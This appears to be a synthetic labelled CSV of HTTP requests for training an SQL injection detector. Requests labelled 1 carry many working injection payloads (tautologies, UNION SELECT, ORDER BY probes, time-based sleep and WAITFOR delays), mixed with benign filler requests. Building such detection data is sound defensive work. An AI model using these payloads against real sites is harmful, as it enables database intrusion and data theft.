text,flow_duration,label
POST /search {'keyword': '/'},6301,1
GET /api/v1/users?id=3307,48983,0
"POST /login {'user': ',', 'pass': 'password123'}",2891,1
GET /index.php?page=smith' OR '1'='1,2334,1
POST /profile/update {'email': 'test.user@example.com'},64924,0
GET /images/products/i.jpg,3403,0
GET /search?q=1-false,1220,1
GET /blog/posts?page=16,45029,0
GET /search.aspx?q=admin' #,3980,1
"POST /login {'user': ''admin'--', 'pass': 'password123'}",1182,1
GET /assets/css/main.css,28142,0
POST /search {'keyword': '' OR 1=1 /*'},6844,1
GET /admin/login?user=' OR 1=1 /*,72227,1
"POST /login {'user': 'admin' #', 'pass': 'password123'}",7121,1
"POST /login {'user': '4', 'pass': 'password123'}",23480,0
GET /blog/posts?page=5,54291,0
GET /products/details?productID=I,13964,0
GET /api/v1/users?id=1556,123810,0
GET /api/v1/users?id=105-1,39632,1
GET /search.aspx?q=' AND user IS NULL; --,44569,1
GET /products/details?productID=' OR 1=1--,3060,1
POST /search {'keyword': '1' and '1'='1'},3914,1
GET /assets/css/main.css,75160,0
GET /api/v1/users?id=' or 1=1 limit 1 --,4940,1
"POST /login {'user': 'G', 'pass': 'password123'}",41327,0
GET /products/details?productID=' OR '1'='1,138415,1
GET /products/details?productID=' or 'x'='x,2814,1
GET /products/details?productID=1*1,129199,1
"POST /login {'user': 'w', 'pass': 'password123'}",89470,0
GET /images/products/o.jpg,69782,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",7191,1
GET /images/products/Q.jpg,99559,0
GET /products/details?productID=' AND user IS NULL; --,37939,1
GET /api/v1/users?id=8791,73234,0
GET /products/details?productID=X,39613,0
GET /products/home/h,81445,0
GET /api/v1/users?id=8407,16922,0
"POST /api/v1/cart/add {'item_id': '9572', 'quantity': 4}",118008,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",119143,1
"GET /search?q=1' ORDER BY 1,2--+",87465,1
GET /products/details?productID=u,38760,0
"POST /api/v1/cart/add {'item_id': '6970', 'quantity': 5}",27221,0
"POST /login.php {'username': '1' and '1'='1', 'password': 'password'}",5862,1
"POST /login {'user': '``', 'pass': 'password123'}",123809,1
"POST /login {'user': ''admin'--', 'pass': 'password123'}",74237,1
GET /api/v1/users?id=2630,125552,0
GET /search.aspx?q=' AND id IS NULL; --,101826,1
"POST /login {'user': 'C', 'pass': 'password123'}",25487,0
GET /api/v1/users?id=1' and '1'='1,76669,1
GET /items/show.php?id=' OR 'x'='x,7712,1
GET /products/books/t,67235,0
GET /api/v1/users?id=';WAITFOR DELAY '0:0:30'--,124285,1
GET /products/details?productID=' AND user IS NULL; --,2206,1
GET /search?q=U,32692,0
GET /products/details?productID=1' OR '1'='1' --,112325,1
"POST /api/v1/cart/add {'item_id': '9055', 'quantity': 2}",123658,0
GET /products/details?productID=smith' OR '1'='1,3177,1
"POST /login {'user': 'OR '1'='1'', 'pass': 'password123'}",78767,1
POST /profile/update {'email': 'test.user@example.com'},144988,0
GET /items/show.php?id='=0--+,4912,1
GET /user/profile?user_id=1' OR '1'='1' --,4613,1
GET /items/show.php?id=' AND user IS NULL; --,136093,1
GET /assets/css/main.css,72139,0
GET /products/books/8,62320,0
"POST /api/v1/cart/add {'item_id': '9954', 'quantity': 1}",78075,0
GET /api/v1/users?id=user1' or 1=1 --,3422,1
"POST /login {'user': '1' ORDER BY 1--+', 'pass': 'password123'}",112357,1
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",86562,1
GET /images/products/4.jpg,50606,0
GET /api/v1/users?id=5068,131309,0
GET /assets/css/main.css,57507,0
GET /search?q=1' OR '1'='1' --,98575,1
GET /blog/posts?page=20,56128,0
GET /search?q=S,84259,0
"GET /search.aspx?q="" OR 1 = 1 -- -",99132,1
GET /search?q=z,8129,0
"POST /login {'user': '-2', 'pass': 'password123'}",36972,1
GET /products/books/U,5148,0
GET /products/details?productID=X,96931,0
GET /search?q=OR+%271%27%3D%271,7860,1
GET /admin/login?user=' OR 1=1--,9119,1
GET /search?q=G,69886,0
GET /api/v1/users?id=5316,99755,0
GET /blog/posts?page=2,37669,0
GET /user/profile?user_id=1' and '1'='1,3415,1
GET /search?q=D,79870,0
GET /admin/login?user=' OR '1'='1,4106,1
GET /items/show.php?id=105-1,2961,1
POST /profile/update {'email': 'test.user@example.com'},68800,0
"POST /login.php {'username': '105-1', 'password': 'password'}",2477,1
GET /images/products/j.jpg,84154,0
GET /products/details?productID=x' or 1=1--,8837,1
GET /products/details?productID=1*1,1589,1
GET /images/products/g.jpg,41753,0
GET /products/home/F,17268,0
GET /search.aspx?q=' OR '1'='1,143210,1
GET /products/details?productID='LIKE',82054,1
GET /assets/css/main.css,13262,0
"GET /products/details?productID=-1' UNION SELECT 1,2,3--+",5596,1
GET /api/v1/users?id=6843,134588,0
GET /images/products/V.jpg,49035,0
GET /products/details?productID=Y,69195,0
GET /assets/css/main.css,32161,0
GET /search?q=7,149340,0
GET /products/home/u,42542,0
GET /index.php?page=x' or 1=1--,208,1
GET /blog/posts?page=14,34570,0
GET /products/home/q,76664,0
GET /index.php?page=x' or 1=1--,106038,1
GET /images/products/M.jpg,61609,0
GET /admin/login?user=%00,1023,1
POST /profile/update {'email': 'test.user@example.com'},109038,0
GET /products/details?productID=user1' or 1=1 --,103323,1
"POST /api/v1/cart/add {'item_id': '9322', 'quantity': 1}",63624,0
GET /index.php?page=admin' #,7865,1
GET /user/profile?user_id=smith' OR '1'='1,28851,1
GET /products/details?productID=o,79433,0
GET /products/details?productID=user1' or 1=1 --,131311,1
GET /blog/posts?page=1,18330,0
"POST /api/v1/cart/add {'item_id': '4429', 'quantity': 4}",101970,0
"POST /login {'user': '105-1', 'pass': 'password123'}",2022,1
GET /admin/login?user=OR '1'='1',81615,1
GET /search.aspx?q=1 AND 1=1,19808,1
GET /index.php?page=' OR 1=1 /*,60581,1
POST /profile/update {'email': 'test.user@example.com'},30342,0
GET /search?q=L,99788,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",71621,1
GET /search?q=k,5895,0
GET /products/electronics/F,142096,0
GET /admin/login?user=``,4855,1
GET /products/details?productID=1*1,36941,1
GET /user/profile?user_id=1 AND 1=1,5040,1
"POST /login {'user': '''', 'pass': 'password123'}",135622,1
GET /blog/posts?page=4,81377,0
GET /products/details?productID=1024-2,2197,1
GET /products/details?productID=f,60604,0
GET /search?q=D,53497,0
GET /user/profile?user_id=1 AND 1=1,6583,1
GET /index.php?page=user1' or 1=1 --,28904,1
GET /search.aspx?q=\\,94326,1
GET /blog/posts?page=17,129428,0
"GET /items/show.php?id="" OR 1 = 1 -- -",1257,1
GET /images/products/S.jpg,105243,0
GET /api/v1/users?id=1' ORDER BY 1--+,82188,1
GET /api/v1/users?id=2690,4295,0
GET /search.aspx?q=\\,119993,1
GET /api/v1/users?id=5358,27520,0
"POST /login {'user': 'l', 'pass': 'password123'}",9483,0
"POST /login {'user': '5', 'pass': 'password123'}",67069,0
GET /user/profile?user_id=1' ORDER BY 2--+,4339,1
GET /search?q=' OR 1=1--,104156,1
GET /blog/posts?page=19,83916,0
GET /index.php?page=' or 1=1 limit 1 --,20182,1
POST /profile/update {'email': 'test.user@example.com'},135283,0
GET /index.php?page=' OR '1'='1,79824,1
GET /products/details?productID=2,10350,0
GET /assets/css/main.css,135682,0
GET /blog/posts?page=14,35996,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",143930,1
GET /products/electronics/d,36388,0
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",70116,1
GET /api/v1/users?id=5438,58211,0
GET /search.aspx?q=1' and '1'='1,4711,1
GET /items/show.php?id=1024-2,92082,1
GET /api/v1/users?id=user1' or 1=1 --,5476,1
GET /api/v1/users?id=6083,55506,0
GET /products/electronics/q,55336,0
"GET /search?q=""",9550,1
GET /search?q=1' OR '1'='1' --,737,1
GET /items/show.php?id=OR+%271%27%3D%271,1247,1
GET /items/show.php?id=' OR '1'='1,5855,1
GET /search.aspx?q=1 AND (SELECT * FROM Users) = 1,4589,1
"POST /login {'user': '';WAITFOR DELAY '0:0:30'--', 'pass': 'password123'}",7681,1
GET /products/electronics/5,66223,0
"GET /search.aspx?q=' or """,2819,1
GET /api/v1/users?id=2152,64239,0
GET /api/v1/users?id=OR '1'='1',6152,1
GET /images/products/1.jpg,49217,0
"POST /api/v1/cart/add {'item_id': '9758', 'quantity': 3}",137918,0
"POST /login {'user': 'n', 'pass': 'password123'}",108548,0
GET /admin/login?user=OR+%271%27%3D%271,5316,1
GET /products/details?productID=f,78503,0
GET /search?q=1 AND 1=1,30198,1
"GET /api/v1/users?id=,",46963,1
GET /search.aspx?q=admin' #,5395,1
"POST /login {'user': '1*56', 'pass': 'password123'}",22053,1
GET /index.php?page=105-1,59392,1
GET /search.aspx?q=1' and '1'='1,114628,1
GET /products/details?productID=1*1,133129,1
"POST /login.php {'username': 'OR+%271%27%3D%271', 'password': 'password'}",6665,1
GET /products/details?productID=r,132510,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",37764,1
GET /search?q=E,79408,0
GET /images/products/o.jpg,22805,0
GET /products/details?productID=' OR 1=1--,4788,1
GET /blog/posts?page=1,112520,0
"POST /api/v1/cart/add {'item_id': '1067', 'quantity': 2}",47679,0
GET /search.aspx?q=105-1,1898,1
GET /blog/posts?page=2,82682,0
"POST /login {'user': '4', 'pass': 'password123'}",36651,0
GET /images/products/t.jpg,73121,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",96,1
GET /admin/login?user=' OR '1,287,1
GET /assets/css/main.css,111621,0
GET /api/v1/users?id=OR '1'='1',7987,1
GET /products/details?productID=x' or 1=1--,90045,1
GET /items/show.php?id=OR 1=1,70363,1
GET /products/electronics/V,7628,0
GET /assets/css/main.css,210,0
GET /api/v1/users?id=x' or 1=1--,115015,1
GET /images/products/y.jpg,85706,0
GET /blog/posts?page=18,48961,0
"POST /api/v1/cart/add {'item_id': '3333', 'quantity': 2}",63718,0
GET /api/v1/users?id=6434,121698,0
GET /blog/posts?page=1,52594,0
GET /index.php?page=' or 1=1 limit 1 --,7983,1
GET /search?q=h,123086,0
POST /profile/update {'email': 'test.user@example.com'},31597,0
"POST /login {'user': '2', 'pass': 'password123'}",8117,0
GET /assets/css/main.css,30731,0
POST /search {'keyword': 'OR+%271%27%3D%271'},61227,1
"POST /login {'user': 'M', 'pass': 'password123'}",73983,0
GET /search?q='admin'--,7133,1
GET /blog/posts?page=3,75356,0
GET /index.php?page=%2c(select%20*%20from%20(select(sleep(10)))a),234,1
GET /products/details?productID=s,73149,0
GET /user/profile?user_id=' AND user IS NULL; --,91283,1
GET /assets/css/main.css,39731,0
GET /search?q=user1' or 1=1 --,5660,1
GET /search?q=t,40481,0
GET /products/details?productID=user1' or 1=1 --,85693,1
GET /products/electronics/a,48301,0
GET /products/details?productID=AND false,1111,1
"POST /api/v1/cart/add {'item_id': '7364', 'quantity': 4}",60957,0
GET /blog/posts?page=9,84492,0
"POST /login {'user': 'smith' OR '1'='1', 'pass': 'password123'}",7887,1
GET /search?q=w,82455,0
GET /api/v1/users?id=896,67186,0
"POST /login {'user': 'p', 'pass': 'password123'}",21218,0
GET /images/products/C.jpg,12008,0
"GET /user/profile?user_id=,(select * from (select(sleep(10)))a)",6008,1
POST /profile/update {'email': 'test.user@example.com'},118028,0
POST /profile/update {'email': 'test.user@example.com'},27244,0
GET /api/v1/users?id=6243,67945,0
GET /index.php?page='=0--+,5645,1
GET /assets/css/main.css,88917,0
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",73099,1
GET /items/show.php?id=1=1,1753,1
GET /assets/css/main.css,18058,0
GET /api/v1/users?id=' GROUP BY columnnames having 1=1 --,72393,1
GET /admin/login?user=1=1,3347,1
POST /profile/update {'email': 'test.user@example.com'},13812,0
GET /search?q=x' or 1=1--,144143,1
GET /api/v1/users?id=2140,66025,0
POST /profile/update {'email': 'test.user@example.com'},22434,0
GET /index.php?page=1' ORDER BY 1--+,128658,1
GET /products/details?productID=' OR 1=1 /*,135624,1
"POST /login {'user': 's', 'pass': 'password123'}",11685,0
GET /products/electronics/a,35263,0
GET /search?q=1' and '1'='1,2808,1
GET /api/v1/users?id=admin' #,30135,1
GET /search?q=\,5862,1
GET /products/details?productID=y,32982,0
GET /search?q=f,128084,0
GET /api/v1/users?id=4328,127442,0
GET /products/details?productID=1024-2,6171,1
GET /products/books/7,142170,0
GET /search?q=i,9707,0
GET /items/show.php?id=1*56,58639,1
"GET /api/v1/users?id=,",28367,1
GET /search?q=4,139635,0
POST /profile/update {'email': 'test.user@example.com'},15411,0
POST /search {'keyword': ''admin'--'},2962,1
POST /profile/update {'email': 'test.user@example.com'},55064,0
"POST /login {'user': 'G', 'pass': 'password123'}",22483,0
GET /api/v1/users?id=' or 'x'='x,45564,1
"POST /login {'user': 'a', 'pass': 'password123'}",84287,0
"POST /login.php {'username': '1=1', 'password': 'password'}",98861,1
"POST /login {'user': 'e', 'pass': 'password123'}",41606,0
GET /search.aspx?q=' OR '1,5838,1
GET /user/profile?user_id='=',110412,1
"POST /login.php {'username': '' OR 1=1--', 'password': 'password'}",7843,1
GET /api/v1/users?id=AND false,16776,1
GET /images/products/e.jpg,62950,0
GET /blog/posts?page=3,64931,0
GET /products/details?productID=n,79027,0
GET /api/v1/users?id=x' or 1=1--,2331,1
GET /assets/css/main.css,69111,0
"POST /search {'keyword': '1' ORDER BY 1,2--+'}",2646,1
GET /images/products/z.jpg,16330,0
"POST /api/v1/cart/add {'item_id': '9960', 'quantity': 4}",16606,0
GET /api/v1/users?id=' OR '1'='1,109825,1
GET /api/v1/users?id=' or 'x'='x,4395,1
GET /api/v1/users?id=1951,81571,0
GET /images/products/1.jpg,123957,0
"POST /login {'user': '8', 'pass': 'password123'}",59814,0
GET /products/details?productID=k,70167,0
GET /blog/posts?page=5,80815,0
GET /items/show.php?id=' AND id IS NULL; --,377,1
GET /products/books/w,59881,0
GET /api/v1/users?id=AND 0,3678,1
GET /blog/posts?page=9,36272,0
GET /index.php?page=' or 1=1 limit 1 --,957,1
"POST /search {'keyword': '' or ""'}",2188,1
GET /search?q=admin' #,130399,1
GET /products/details?productID=OR '1'='1',73536,1
GET /index.php?page=1*1,5056,1
GET /search?q=N,4849,0
GET /items/show.php?id=OR '1'='1',129179,1
GET /images/products/W.jpg,20978,0
"POST /login {'user': '0', 'pass': 'password123'}",100438,0
"POST /api/v1/cart/add {'item_id': '5001', 'quantity': 5}",134100,0
GET /api/v1/users?id=user1' or 1=1 --,426,1
GET /search?q=U,94270,0
POST /profile/update {'email': 'test.user@example.com'},42806,0
GET /search?q=n,11530,0
GET /assets/css/main.css,74461,0
GET /search?q=q,54807,0
POST /profile/update {'email': 'test.user@example.com'},62595,0
GET /search?q=AND 1,51101,1
GET /products/books/B,83891,0
GET /products/details?productID=' or 'x'='x,6342,1
POST /search {'keyword': '1 AND 1=1'},4292,1
GET /blog/posts?page=16,63360,0
GET /search?q=user1' or 1=1 --,140978,1
"POST /login {'user': 'user1' or 1=1 --', 'pass': 'password123'}",70908,1
GET /user/profile?user_id=user1' or 1=1 --,134116,1
GET /assets/css/main.css,128229,0
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",1748,1
GET /assets/css/main.css,48715,0
GET /index.php?page=1' OR '1'='1' --,36253,1
GET /search?q=M,20742,0
GET /api/v1/users?id=5732,8548,0
"GET /search.aspx?q=' or """,758,1
GET /api/v1/users?id=' GROUP BY columnnames having 1=1 --,4003,1
GET /api/v1/users?id=1 AND 1=1,24389,1
GET /blog/posts?page=11,116193,0
"POST /login {'user': '\', 'pass': 'password123'}",218,1
POST /search {'keyword': 'admin' #'},3823,1
GET /products/details?productID=' or 'x'='x,114693,1
GET /api/v1/users?id=smith' OR '1'='1,4824,1
"GET /index.php?page=1' ORDER BY 1,2,3--+",460,1
POST /search {'keyword': '1=1'},2914,1
GET /api/v1/users?id=9942,31998,0
GET /api/v1/users?id=3928,30145,0
GET /api/v1/users?id=9424,116322,0
GET /user/profile?user_id=AND true,3059,1
GET /api/v1/users?id=' OR 1=1--,5552,1
GET /products/details?productID=admin' #,49530,1
"POST /login.php {'username': '' OR '1'='1', 'password': 'password'}",17168,1
POST /profile/update {'email': 'test.user@example.com'},86114,0
"POST /login {'user': 'G', 'pass': 'password123'}",112981,0
"POST /api/v1/cart/add {'item_id': '7914', 'quantity': 2}",47637,0
GET /assets/css/main.css,73120,0
GET /products/books/l,33494,0
"POST /api/v1/cart/add {'item_id': '6619', 'quantity': 2}",41266,0
POST /profile/update {'email': 'test.user@example.com'},77403,0
GET /index.php?page='admin'--,131055,1
GET /products/details?productID=U,32931,0
GET /blog/posts?page=5,18233,0
"POST /search {'keyword': '1' ORDER BY 1,2--+'}",147239,1
POST /search {'keyword': 'admin' #'},90509,1
"POST /login {'user': 'T', 'pass': 'password123'}",76686,0
"POST /login {'user': '-- or #', 'pass': 'password123'}",6655,1
GET /search?q=1024-2,3905,1
GET /items/show.php?id=' OR 'x'='x,116010,1
GET /images/products/1.jpg,18155,0
GET /search?q=OR+%271%27%3D%271,104733,1
GET /search?q=' OR 'x'='x,64120,1
"POST /login {'user': 'a', 'pass': 'password123'}",144869,0
GET /search?q=admin' #,2565,1
GET /api/v1/users?id=1' OR '1'='1' --,2332,1
POST /profile/update {'email': 'test.user@example.com'},5848,0
POST /search {'keyword': '//'},7716,1
"POST /login {'user': '9', 'pass': 'password123'}",114343,0
GET /search?q=admin' #,5381,1
GET /assets/css/main.css,60117,0
GET /items/show.php?id=1=1,31698,1
"POST /login {'user': '``', 'pass': 'password123'}",822,1
GET /items/show.php?id=smith' OR '1'='1,5089,1
GET /images/products/R.jpg,30264,0
"POST /login {'user': '1*1', 'pass': 'password123'}",4307,1
GET /search?q=F,30934,0
GET /products/details?productID=j,79651,0
"POST /login {'user': 'Z', 'pass': 'password123'}",35243,0
"POST /login {'user': '3', 'pass': 'password123'}",87786,0
"POST /api/v1/cart/add {'item_id': '2212', 'quantity': 4}",77023,0
GET /search?q=i,130884,0
GET /search?q=1' OR '1'='1' --,4117,1
POST /search {'keyword': '' OR 1=1--'},110431,1
GET /products/details?productID=' OR '1'='1,129370,1
GET /user/profile?user_id=1' and '1'='1,15762,1
POST /profile/update {'email': 'test.user@example.com'},12664,0
